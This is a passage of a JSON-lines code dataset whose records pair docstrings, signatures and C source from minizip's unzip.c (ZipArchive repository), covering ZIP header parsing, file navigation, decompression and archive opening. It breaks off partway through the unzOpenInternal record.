{"docstring": "/*\nRead extra field from the current file (opened by unzOpenCurrentFile)\nThis is the local-header version of the extra field (sometimes, there is\nmore info in the local-header version than in the central-header)\n\n  if buf==NULL, it return the size of the local extra field that can be read\n\n  if buf!=NULL, len is the size of the buffer, the extra header is copied in\n    buf.\n  the return value is the number of bytes copied in buf, or (if <0)\n    the error code\n*/\n", "func_signal": "extern int ZEXPORT unzGetLocalExtrafield (unzFile file, voidp buf, unsigned len)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    uInt read_now;\n    ZPOS64_T size_to_read;\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    size_to_read = (pfile_in_zip_read_info->size_local_extrafield -\n                pfile_in_zip_read_info->pos_local_extrafield);\n\n    if (buf==NULL)\n        return (int)size_to_read;\n\n    if (len>size_to_read)\n        read_now = (uInt)size_to_read;\n    else\n        read_now = (uInt)len ;\n\n    if (read_now==0)\n        return 0;\n\n    if (ZSEEK64(pfile_in_zip_read_info->z_filefunc,\n              pfile_in_zip_read_info->filestream,\n              pfile_in_zip_read_info->offset_local_extrafield +\n              pfile_in_zip_read_info->pos_local_extrafield,\n              ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n    if (ZREAD64(pfile_in_zip_read_info->z_filefunc,\n              pfile_in_zip_read_info->filestream,\n              buf,read_now)!=read_now)\n        return UNZ_ERRNO;\n\n    return (int)read_now;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Read the local header of the current zipfile\n  Check the coherency of the local header and info in the end of central\n        directory about this file\n  store in *piSizeVar the size of extra info in local header\n        (filename and size of extra field data)\n*/\n", "func_signal": "local int unz64local_CheckCurrentFileCoherencyHeader (unz64_s* s, uInt* piSizeVar,\n                                                    ZPOS64_T * poffset_local_extrafield,\n                                                    uInt  * psize_local_extrafield)", "code": "{\n    uLong uMagic,uData,uFlags;\n    uLong size_filename;\n    uLong size_extra_field;\n    int err=UNZ_OK;\n\n    *piSizeVar = 0;\n    *poffset_local_extrafield = 0;\n    *psize_local_extrafield = 0;\n\n    if (ZSEEK64(s->z_filefunc, s->filestream,s->cur_file_info_internal.offset_curfile +\n                                s->byte_before_the_zipfile,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n\n    if (err==UNZ_OK)\n    {\n        if (unz64local_getLong(&s->z_filefunc, s->filestream,&uMagic) != UNZ_OK)\n            err=UNZ_ERRNO;\n        else if (uMagic!=0x04034b50)\n            err=UNZ_BADZIPFILE;\n    }\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uData) != UNZ_OK)\n        err=UNZ_ERRNO;\n/*\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.wVersion))\n        err=UNZ_BADZIPFILE;\n*/\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uFlags) != UNZ_OK)\n        err=UNZ_ERRNO;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uData) != UNZ_OK)\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.compression_method))\n        err=UNZ_BADZIPFILE;\n\n    if ((err==UNZ_OK) && (s->cur_file_info.compression_method!=0) &&\n/* #ifdef HAVE_BZIP2 */\n                         (s->cur_file_info.compression_method!=Z_BZIP2ED) &&\n/* #endif */\n                         (s->cur_file_info.compression_method!=Z_DEFLATED))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* date/time */\n        err=UNZ_ERRNO;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* crc */\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.crc) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* size compr */\n        err=UNZ_ERRNO;\n    else if (uData != 0xFFFFFFFF && (err==UNZ_OK) && (uData!=s->cur_file_info.compressed_size) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* size uncompr */\n        err=UNZ_ERRNO;\n    else if (uData != 0xFFFFFFFF && (err==UNZ_OK) && (uData!=s->cur_file_info.uncompressed_size) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&size_filename) != UNZ_OK)\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (size_filename!=s->cur_file_info.size_filename))\n        err=UNZ_BADZIPFILE;\n\n    *piSizeVar += (uInt)size_filename;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&size_extra_field) != UNZ_OK)\n        err=UNZ_ERRNO;\n    *poffset_local_extrafield= s->cur_file_info_internal.offset_curfile +\n                                    SIZEZIPLOCALHEADER + size_filename;\n    *psize_local_extrafield = (uInt)size_extra_field;\n\n    *piSizeVar += (uInt)size_extra_field;\n\n    return err;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Give the current position in uncompressed data\n*/\n", "func_signal": "extern z_off_t ZEXPORT unztell (unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    return (z_off_t)pfile_in_zip_read_info->stream.total_out;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n   Translate date/time from Dos format to tm_unz (readable more easilty)\n*/\n", "func_signal": "local void unz64local_DosDateToTmuDate (ZPOS64_T ulDosDate, tm_unz* ptm)", "code": "{\n    ZPOS64_T uDate;\n    uDate = (ZPOS64_T)(ulDosDate>>16);\n    ptm->tm_mday = (uInt)(uDate&0x1f) ;\n    ptm->tm_mon =  (uInt)((((uDate)&0x1E0)/0x20)-1) ;\n    ptm->tm_year = (uInt)(((uDate&0x0FE00)/0x0200)+1980) ;\n\n    ptm->tm_hour = (uInt) ((ulDosDate &0xF800)/0x800);\n    ptm->tm_min =  (uInt) ((ulDosDate&0x7E0)/0x20) ;\n    ptm->tm_sec =  (uInt) (2*(ulDosDate&0x1f)) ;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Write info about the ZipFile in the *pglobal_info structure.\n  No preparation of the structure is needed\n  return UNZ_OK if there is no problem. */\n", "func_signal": "extern int ZEXPORT unzGetGlobalInfo64 (unzFile file, unz_global_info64* pglobal_info)", "code": "{\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    *pglobal_info=s->gi;\n    return UNZ_OK;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Set the current file of the zipfile to the next file.\n  return UNZ_OK if there is no problem\n  return UNZ_END_OF_LIST_OF_FILE if the actual file was the latest.\n*/\n", "func_signal": "extern int ZEXPORT unzGoToNextFile (unzFile  file)", "code": "{\n    unz64_s* s;\n    int err;\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n    if (s->gi.number_entry != 0xffff)    /* 2^16 files overflow hack */\n      if (s->num_file+1==s->gi.number_entry)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    s->pos_in_central_dir += SIZECENTRALDIRITEM + s->cur_file_info.size_filename +\n            s->cur_file_info.size_file_extra + s->cur_file_info.size_file_comment ;\n    s->num_file++;\n    err = unz64local_GetCurrentFileInfoInternal(file,&s->cur_file_info,\n                                               &s->cur_file_info_internal,\n                                               NULL,0,NULL,0,NULL,0);\n    s->current_file_ok = (err == UNZ_OK);\n    return err;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/** Addition for GDAL : START */\n", "func_signal": "extern ZPOS64_T ZEXPORT unzGetCurrentFileZStreamPos64( unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    s=(unz64_s*)file;\n    if (file==NULL)\n        return 0; //UNZ_PARAMERROR;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n    if (pfile_in_zip_read_info==NULL)\n        return 0; //UNZ_PARAMERROR;\n    return pfile_in_zip_read_info->pos_in_zipfile +\n                         pfile_in_zip_read_info->byte_before_the_zipfile;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Read bytes from the current file.\n  buf contain buffer where data must be copied\n  len the size of buf.\n\n  return the number of byte copied if somes bytes are copied\n  return 0 if the end of file was reached\n  return <0 with error code if there is an error\n    (UNZ_ERRNO for IO error, or zLib error for uncompress error)\n*/\n", "func_signal": "extern int ZEXPORT unzReadCurrentFile  (unzFile file, voidp buf, unsigned len)", "code": "{\n    int err=UNZ_OK;\n    uInt iRead = 0;\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n\n    if (pfile_in_zip_read_info->read_buffer == NULL)        return UNZ_END_OF_LIST_OF_FILE;\n    if (len==0)\n        return 0;\n\n    pfile_in_zip_read_info->stream.next_out = (Bytef*)buf;\n\n    pfile_in_zip_read_info->stream.avail_out = (uInt)len;\n\n    if ((len>pfile_in_zip_read_info->rest_read_uncompressed) &&\n        (!(pfile_in_zip_read_info->raw)))\n        pfile_in_zip_read_info->stream.avail_out =\n            (uInt)pfile_in_zip_read_info->rest_read_uncompressed;\n\n    if ((len>pfile_in_zip_read_info->rest_read_compressed+\n           pfile_in_zip_read_info->stream.avail_in) &&\n         (pfile_in_zip_read_info->raw))\n        pfile_in_zip_read_info->stream.avail_out =\n            (uInt)pfile_in_zip_read_info->rest_read_compressed+\n            pfile_in_zip_read_info->stream.avail_in;\n\n    while (pfile_in_zip_read_info->stream.avail_out>0)\n    {\n        if ((pfile_in_zip_read_info->stream.avail_in==0) &&\n            (pfile_in_zip_read_info->rest_read_compressed>0))\n        {\n            uInt uReadThis = UNZ_BUFSIZE;\n            if (pfile_in_zip_read_info->rest_read_compressed<uReadThis)\n                uReadThis = (uInt)pfile_in_zip_read_info->rest_read_compressed;\n            if (uReadThis == 0)\n                return UNZ_EOF;\n            if (ZSEEK64(pfile_in_zip_read_info->z_filefunc,\n                      pfile_in_zip_read_info->filestream,\n                      pfile_in_zip_read_info->pos_in_zipfile +\n                         pfile_in_zip_read_info->byte_before_the_zipfile,\n                         ZLIB_FILEFUNC_SEEK_SET)!=0)\n                return UNZ_ERRNO;\n            if (ZREAD64(pfile_in_zip_read_info->z_filefunc,\n                      pfile_in_zip_read_info->filestream,\n                      pfile_in_zip_read_info->read_buffer,\n                      uReadThis)!=uReadThis)\n                return UNZ_ERRNO;\n\n\n#            ifndef NOUNCRYPT\n            if(s->encrypted)\n            {\n                uInt i;\n                for(i=0;i<uReadThis;i++)\n                  pfile_in_zip_read_info->read_buffer[i] =\n                      zdecode(s->keys,s->pcrc_32_tab,\n                              pfile_in_zip_read_info->read_buffer[i]);\n            }\n#            endif\n\n\n            pfile_in_zip_read_info->pos_in_zipfile += uReadThis;\n\n            pfile_in_zip_read_info->rest_read_compressed-=uReadThis;\n\n            pfile_in_zip_read_info->stream.next_in =\n                (Bytef*)pfile_in_zip_read_info->read_buffer;\n            pfile_in_zip_read_info->stream.avail_in = (uInt)uReadThis;\n        }\n\n        if ((pfile_in_zip_read_info->compression_method==0) || (pfile_in_zip_read_info->raw))\n        {\n            uInt uDoCopy,i ;\n\n            if ((pfile_in_zip_read_info->stream.avail_in == 0) &&\n                (pfile_in_zip_read_info->rest_read_compressed == 0))\n                return (iRead==0) ? UNZ_EOF : iRead;\n\n            if (pfile_in_zip_read_info->stream.avail_out <\n                            pfile_in_zip_read_info->stream.avail_in)\n                uDoCopy = pfile_in_zip_read_info->stream.avail_out ;\n            else\n                uDoCopy = pfile_in_zip_read_info->stream.avail_in ;\n\n            for (i=0;i<uDoCopy;i++)\n                *(pfile_in_zip_read_info->stream.next_out+i) =\n                        *(pfile_in_zip_read_info->stream.next_in+i);\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uDoCopy;\n\n            pfile_in_zip_read_info->crc32 = crc32(pfile_in_zip_read_info->crc32,\n                                pfile_in_zip_read_info->stream.next_out,\n                                uDoCopy);\n            pfile_in_zip_read_info->rest_read_uncompressed-=uDoCopy;\n            pfile_in_zip_read_info->stream.avail_in -= uDoCopy;\n            pfile_in_zip_read_info->stream.avail_out -= uDoCopy;\n            pfile_in_zip_read_info->stream.next_out += uDoCopy;\n            pfile_in_zip_read_info->stream.next_in += uDoCopy;\n            pfile_in_zip_read_info->stream.total_out += uDoCopy;\n            iRead += uDoCopy;\n        }\n        else if (pfile_in_zip_read_info->compression_method==Z_BZIP2ED)\n        {\n#ifdef HAVE_BZIP2\n            uLong uTotalOutBefore,uTotalOutAfter;\n            const Bytef *bufBefore;\n            uLong uOutThis;\n\n            pfile_in_zip_read_info->bstream.next_in        = (char*)pfile_in_zip_read_info->stream.next_in;\n            pfile_in_zip_read_info->bstream.avail_in       = pfile_in_zip_read_info->stream.avail_in;\n            pfile_in_zip_read_info->bstream.total_in_lo32  = pfile_in_zip_read_info->stream.total_in;\n            pfile_in_zip_read_info->bstream.total_in_hi32  = 0;\n            pfile_in_zip_read_info->bstream.next_out       = (char*)pfile_in_zip_read_info->stream.next_out;\n            pfile_in_zip_read_info->bstream.avail_out      = pfile_in_zip_read_info->stream.avail_out;\n            pfile_in_zip_read_info->bstream.total_out_lo32 = pfile_in_zip_read_info->stream.total_out;\n            pfile_in_zip_read_info->bstream.total_out_hi32 = 0;\n\n            uTotalOutBefore = pfile_in_zip_read_info->bstream.total_out_lo32;\n            bufBefore = (const Bytef *)pfile_in_zip_read_info->bstream.next_out;\n\n            err=BZ2_bzDecompress(&pfile_in_zip_read_info->bstream);\n\n            uTotalOutAfter = pfile_in_zip_read_info->bstream.total_out_lo32;\n            uOutThis = uTotalOutAfter-uTotalOutBefore;\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uOutThis;\n\n            pfile_in_zip_read_info->crc32 = crc32(pfile_in_zip_read_info->crc32,bufBefore, (uInt)(uOutThis));\n            pfile_in_zip_read_info->rest_read_uncompressed -= uOutThis;\n            iRead += (uInt)(uTotalOutAfter - uTotalOutBefore);\n\n            pfile_in_zip_read_info->stream.next_in   = (Bytef*)pfile_in_zip_read_info->bstream.next_in;\n            pfile_in_zip_read_info->stream.avail_in  = pfile_in_zip_read_info->bstream.avail_in;\n            pfile_in_zip_read_info->stream.total_in  = pfile_in_zip_read_info->bstream.total_in_lo32;\n            pfile_in_zip_read_info->stream.next_out  = (Bytef*)pfile_in_zip_read_info->bstream.next_out;\n            pfile_in_zip_read_info->stream.avail_out = pfile_in_zip_read_info->bstream.avail_out;\n            pfile_in_zip_read_info->stream.total_out = pfile_in_zip_read_info->bstream.total_out_lo32;\n\n            if (err==BZ_STREAM_END)\n              return (iRead==0) ? UNZ_EOF : iRead;\n            if (err!=BZ_OK)\n              break;\n#endif\n        } // end Z_BZIP2ED\n        else\n        {\n            ZPOS64_T uTotalOutBefore,uTotalOutAfter;\n            const Bytef *bufBefore;\n            ZPOS64_T uOutThis;\n            int flush=Z_SYNC_FLUSH;\n\n            uTotalOutBefore = pfile_in_zip_read_info->stream.total_out;\n            bufBefore = pfile_in_zip_read_info->stream.next_out;\n\n            /*\n            if ((pfile_in_zip_read_info->rest_read_uncompressed ==\n                     pfile_in_zip_read_info->stream.avail_out) &&\n                (pfile_in_zip_read_info->rest_read_compressed == 0))\n                flush = Z_FINISH;\n            */\n            err=inflate(&pfile_in_zip_read_info->stream,flush);\n\n            if ((err>=0) && (pfile_in_zip_read_info->stream.msg!=NULL))\n              err = Z_DATA_ERROR;\n\n            uTotalOutAfter = pfile_in_zip_read_info->stream.total_out;\n            uOutThis = uTotalOutAfter-uTotalOutBefore;\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uOutThis;\n\n            pfile_in_zip_read_info->crc32 =\n                crc32(pfile_in_zip_read_info->crc32,bufBefore,\n                        (uInt)(uOutThis));\n\n            pfile_in_zip_read_info->rest_read_uncompressed -=\n                uOutThis;\n\n            iRead += (uInt)(uTotalOutAfter - uTotalOutBefore);\n\n            if (err==Z_STREAM_END)\n                return (iRead==0) ? UNZ_EOF : iRead;\n            if (err!=Z_OK)\n                break;\n        }\n    }\n\n    if (err==Z_OK)\n        return iRead;\n    return err;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Close the file in zip opened with unzipOpenCurrentFile\n  Return UNZ_CRCERROR if all the file was read but the CRC is not good\n*/\n", "func_signal": "extern int ZEXPORT unzCloseCurrentFile (unzFile file)", "code": "{\n    int err=UNZ_OK;\n\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n\n    if ((pfile_in_zip_read_info->rest_read_uncompressed == 0) &&\n        (!pfile_in_zip_read_info->raw))\n    {\n        if (pfile_in_zip_read_info->crc32 != pfile_in_zip_read_info->crc32_wait)\n            err=UNZ_CRCERROR;\n    }\n\n\n    TRYFREE(pfile_in_zip_read_info->read_buffer);\n    pfile_in_zip_read_info->read_buffer = NULL;\n    if (pfile_in_zip_read_info->stream_initialised == Z_DEFLATED)\n        inflateEnd(&pfile_in_zip_read_info->stream);\n#ifdef HAVE_BZIP2\n    else if (pfile_in_zip_read_info->stream_initialised == Z_BZIP2ED)\n        BZ2_bzDecompressEnd(&pfile_in_zip_read_info->bstream);\n#endif\n\n\n    pfile_in_zip_read_info->stream_initialised = 0;\n    TRYFREE(pfile_in_zip_read_info);\n\n    s->pfile_in_zip_read=NULL;\n\n    return err;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\ntypedef struct unz_file_pos_s\n{\n    ZPOS64_T pos_in_zip_directory;   // offset in file\n    ZPOS64_T num_of_file;            // # of file\n} unz_file_pos;\n*/\n", "func_signal": "extern int ZEXPORT unzGetFilePos64(unzFile file, unz64_file_pos*  file_pos)", "code": "{\n    unz64_s* s;\n\n    if (file==NULL || file_pos==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    file_pos->pos_in_zip_directory  = s->pos_in_central_dir;\n    file_pos->num_of_file           = s->num_file;\n\n    return UNZ_OK;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Get the global comment string of the ZipFile, in the szComment buffer.\n  uSizeBuf is the size of the szComment buffer.\n  return the number of byte copied or an error code <0\n*/\n", "func_signal": "extern int ZEXPORT unzGetGlobalComment (unzFile file, char * szComment, uLong uSizeBuf)", "code": "{\n    unz64_s* s;\n    uLong uReadThis ;\n    if (file==NULL)\n        return (int)UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n\n    uReadThis = uSizeBuf;\n    if (uReadThis>s->gi.size_comment)\n        uReadThis = s->gi.size_comment;\n\n    if (ZSEEK64(s->z_filefunc,s->filestream,s->central_pos+22,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n    if (uReadThis>0)\n    {\n      *szComment='\\0';\n      if (ZREAD64(s->z_filefunc,s->filestream,szComment,uReadThis)!=uReadThis)\n        return UNZ_ERRNO;\n    }\n\n    if ((szComment != NULL) && (uSizeBuf > s->gi.size_comment))\n        *(szComment+s->gi.size_comment)='\\0';\n    return (int)uReadThis;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Set the current file of the zipfile to the first file.\n  return UNZ_OK if there is no problem\n*/\n", "func_signal": "extern int ZEXPORT unzGoToFirstFile (unzFile file)", "code": "{\n    int err=UNZ_OK;\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    s->pos_in_central_dir=s->offset_central_dir;\n    s->num_file=0;\n    err=unz64local_GetCurrentFileInfoInternal(file,&s->cur_file_info,\n                                             &s->cur_file_info_internal,\n                                             NULL,0,NULL,0,NULL,0);\n    s->current_file_ok = (err == UNZ_OK);\n    return err;\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/* My own strcmpi / strcasecmp */\n", "func_signal": "local int strcmpcasenosensitive_internal (const char* fileName1, const char* fileName2)", "code": "{\n    for (;;)\n    {\n        char c1=*(fileName1++);\n        char c2=*(fileName2++);\n        if ((c1>='a') && (c1<='z'))\n            c1 -= 0x20;\n        if ((c2>='a') && (c2<='z'))\n            c2 -= 0x20;\n        if (c1=='\\0')\n            return ((c2=='\\0') ? 0 : -1);\n        if (c2=='\\0')\n            return 1;\n        if (c1<c2)\n            return -1;\n        if (c1>c2)\n            return 1;\n    }\n}", "path": "ZipArchive/minizip/unzip.c", "commit_date": "2013-10-17 00:00:00", "repo_name": "mattconnolly/ZipArchive", "stars": 841, "license": "mit", "language": "c", "size": 293}
{"docstring": "/*\n  Open a Zip file. path contain the full pathname (by example,\n     on a Windows NT computer \"c:\\\\test\\\\zlib114.zip\" or on an Unix computer\n     \"zlib/zlib114.zip\".\n     If the zipfile cannot be opened (file doesn't exist or in not valid), the\n       return value is NULL.\n     Else, the return value is a unzFile Handle, usable with other function\n       of this unzip package.\n*/\n", "func_signal": "local unzFile unzOpenInternal (const void *path,\n                               zlib_filefunc64_32_def* pzlib_filefunc64_32_def,\n                               int is64bitOpenFunction)", "code": "{\n    unz64_s us;\n    unz64_s *s;\n    ZPOS64_T central_pos;\n    uLong   uL;\n\n    uLong number_disk;          /* number of the current dist, used for\n                                   spaning ZIP, unsupported, always 0*/\n    uLong number_disk_with_CD;  /* number the the disk with central dir, used\n                                   for spaning ZIP, unsupported, always 0*/\n    ZPOS64_T number_entry_CD;      /* total number of entries in\n                                   the central dir\n                                   (same than number_entry on nospan) */\n\n    int err=UNZ_OK;\n\n    if (unz_copyright[0]!=' ')\n        return NULL;\n\n    us.z_filefunc.zseek32_file = NULL;\n    us.z_filefunc.ztell32_file = NULL;\n    if (pzlib_filefunc64_32_def==NULL)\n        fill_fopen64_filefunc(&us.z_filefunc.zfile_func64);\n    else\n        us.z_filefunc = *pzlib_filefunc64_32_def;\n    us.is64bitOpenFunction = is64bitOpenFunction;\n\n\n\n    us.filestream = ZOPEN64(us.z_filefunc,\n                                                 path,\n                                                 ZLIB_FILEFUNC_MODE_READ |\n                                                 ZLIB_FILEFUNC_MODE_EXISTING);\n    if (us.filestream==NULL)\n        return NULL;\n\n    central_pos = unz64local_SearchCentralDir64(&us.z_filefunc,us.filestream);\n    if (central_pos)\n    {\n        uLong uS;\n        ZPOS64_T uL64;\n\n        us.isZip64 = 1;\n\n        if (ZSEEK64(us.z_filefunc, us.filestream,\n                                      central_pos,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        err=UNZ_ERRNO;\n\n        /* the signature, already checked */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* size of zip64 end of central directory record */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&uL64)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* version made by */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uS)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* version needed to extract */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uS)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of this disk */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&number_disk)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of the disk with the start of the central directory */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&number_disk_with_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central directory on this disk */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.gi.number_entry)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central directory */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&number_entry_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        if ((number_entry_CD!=us.gi.number_entry) ||\n            (number_disk_with_CD!=0) ||\n            (number_disk!=0))\n            err=UNZ_BADZIPFILE;\n\n        /* size of the central directory */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.size_central_dir)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* offset of start of central directory with respect to the\n          starting disk number */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.offset_central_dir)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        us.gi.size_comment = 0;\n    }\n    else\n    {\n        central_pos = unz64local_SearchCentralDir(&us.z_filefunc,us.filestream);\n        if (central_pos==0)\n            err=UNZ_ERRNO;\n\n        us.isZip64 = 0;\n\n        if (ZSEEK64(us.z_filefunc, us.filestream,\n                                        central_pos,ZLIB_FILEFUNC_SEEK_SET)!=0)\n            err=UNZ_ERRNO;\n\n        /* the signature, already checked */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of this disk */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&number_disk)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of the disk with the start of the central directory */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&number_disk_with_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central dir on this disk */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.gi.number_entry = uL;\n\n        /* total number of entries in the central dir */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        number_entry_CD = uL;\n\n        if ((number_entry_CD!=us.gi.number_entry) ||\n            (number_disk_with_CD!=0) ||\n            (number_disk!=0))\n            err=UNZ_BADZIPFILE;\n\n        /* size of the central directory */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.size_central_dir = uL;\n\n        /* offset of start of central directory with respect to the\n            starting disk number */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.offset_central_dir = uL;\n\n        /* zipfile comment length */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&us.gi.size_comment)!=UNZ_OK)\n            err=UNZ_ERRNO;\n    }\n\n    if ((central_pos<us.offset_central_dir+us.size_central_dir) &&\n        (err==UNZ_OK))\n        err=UNZ_BADZIPFILE;\n\n    if (err!=UNZ_OK)\n    {\n        ZCLOSE64(us.z_filefunc, us.filestream);\n        return NULL;\n    }\n\n    us.byte_before_the_zipfile = central_pos -\n                            (us.offset_central_dir+us.size_central_dir);\n    us.central_pos = central_pos;\n    us.pfile_in_zip_read = NULL;\n    us.encrypted = 0;\n\n\n    s=(unz64_s*)ALLOC(sizeof(unz64_s));\n    if( s != NULL)\n    {\n        *s=us;\n        unzGoToFirstFile((unzFile)s);\n    }\n    return 